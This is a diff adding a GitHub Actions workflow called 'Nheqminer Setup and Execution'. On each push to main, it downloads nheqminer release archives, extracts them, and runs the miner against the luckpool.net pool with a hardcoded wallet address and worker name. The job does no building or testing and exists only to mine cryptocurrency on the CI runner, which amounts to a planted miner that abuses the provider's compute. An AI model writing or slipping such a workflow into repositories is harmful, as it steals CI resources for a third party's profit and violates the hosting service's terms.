@@ -1,0 +1,32 @@
+name: Nheqminer Setup and Execution
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Install wget and tar
+        run: sudo apt-get update && sudo apt-get install -y wget tar
+
+      - name: Download nheqminer
+        run: |
+          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tar.gz
+
+      - name: Extract nheqminer
+        run: |
+          tar -xvf nheqminer-Linux-v0.8.2.tgz
+          tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+
+      - name: Execute nheqminer
+        run: |
+          cd nheqminer
+          ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
